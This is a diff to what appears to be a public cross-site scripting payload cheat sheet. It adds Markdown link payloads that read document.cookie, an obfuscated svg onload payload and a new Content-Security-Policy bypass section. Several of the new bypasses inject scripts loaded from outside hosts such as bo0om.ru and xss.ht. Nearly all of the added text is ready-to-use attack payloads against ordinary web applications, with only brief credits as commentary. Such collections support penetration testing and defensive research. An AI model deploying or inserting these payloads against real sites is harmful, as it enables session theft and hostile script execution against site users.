@@ -6,9 +6,10 @@ Cross-site scripting (XSS) is a type of computer security vulnerability typicall
 - [Identify an XSS endpoint](#identify-an-xss-endpoint)
 - [XSS in HTML/Applications](#xss-in-htmlapplications)
 - [XSS in wrappers javascript and data URI](#xss-in-wrappers-javascript-and-data-uri)
-- [XSS in files](#xss-in-files)
+- [XSS in files (XML/SVG/CSS/Flash/Markdown)](#xss-in-files)
 - [Polyglot XSS](#polyglot-xss)
 - [Filter Bypass and Exotic payloads](#filter-bypass-and-exotic-payloads)
+- [CSP Bypas](#csp-bypass)
 - [Common WAF Bypas](#common-waf-bypass)
 
 ## Exploit code or POC
@@ -230,6 +231,15 @@ XSS in SVG (short)
 <svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
 <svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>
 <svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>
+```
+
+XSS in Markdown
+
+```csharp
+[a](javascript:prompt(document.cookie))
+[a](j a v a s c r i p t:prompt(document.cookie))
+[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
+[a](javascript:window.onerror=alert;throw%201)
 ```
 
 XSS in SWF flash application
@@ -662,12 +672,6 @@ Little Endian : 0xFF 0xFE 0x00 0x00
 XSS : %00%00%fe%ff%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E
 ```
 
-Bypass CSP using JSONP from Google (Trick by [@apfeifer27](https://twitter.com/apfeifer27))
-//google.com/complete/search?client=chrome&jsonp=alert(1);
-
-```js
-<script/src=//google.com/complete/search?client=chrome%26jsonp=alert(1);>"
-```
 
 Bypass using weird encoding or native interpretation to hide the payload (alert())
 
@@ -682,6 +686,7 @@ Bypass using weird encoding or native interpretation to hide the payload (alert(
 Exotic payloads
 
 ```javascript
+<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
 <img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
 <script>$=1,alert($)</script>
 <script ~~~>confirm(1)</script ~~~>
@@ -693,6 +698,42 @@ Exotic payloads
 <img src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)>
 <svg><x><script>alert&#40;&#39;1&#39;&#41</x>
 <iframe src=""/srcdoc='&lt;svg onload&equals;alert&lpar;1&rpar;&gt;'>
+```
+
+## CSP Bypass
+
+Check the CSP on [https://csp-evaluator.withgoogle.com](https://csp-evaluator.withgoogle.com) and the post : [How to use Google’s CSP Evaluator to bypass CSP](https://blog.thomasorlita.cz/vulns/google-csp-evaluator/)
+
+### Bypass CSP using JSONP from Google (Trick by [@apfeifer27](https://twitter.com/apfeifer27))
+
+//google.com/complete/search?client=chrome&jsonp=alert(1);
+
+```js
+<script/src=//google.com/complete/search?client=chrome%26jsonp=alert(1);>"
+```
+
+### Bypass CSP by [lab.wallarm.com](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa)
+
+Works for CSP like `Content-Security-Policy: default-src 'self' 'unsafe-inline';`, [POC here](http://hsts.pro/csp.php?xss=f=document.createElement%28"iframe"%29;f.id="pwn";f.src="/robots.txt";f.onload=%28%29=>%7Bx=document.createElement%28%27script%27%29;x.src=%27//bo0om.ru/csp.js%27;pwn.contentWindow.document.body.appendChild%28x%29%7D;document.body.appendChild%28f%29;)
+
+```js
+script=document.createElement('script');
+script.src='//bo0om.ru/csp.js';
+window.frames[0].document.head.appendChild(script);
+```
+
+### Bypass CSP by [Rhynorater](https://gist.github.com/Rhynorater/311cf3981fda8303d65c27316e69209f)
+
+```js
+d=document;f=d.createElement("iframe");f.src=d.querySelector('link[href*=".css"]').href;d.body.append(f);s=d.createElement("script");s.src="https://swk.xss.ht";setTimeout(function(){f.contentWindow.document.head.append(s);},1000)
+```
+
+### Bypass CSP by [@akita_zen](https://twitter.com/akita_zen)
+
+Works for CSP like `script-src self`
+
+```js
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
 ```
 
 ## Common WAF Bypass
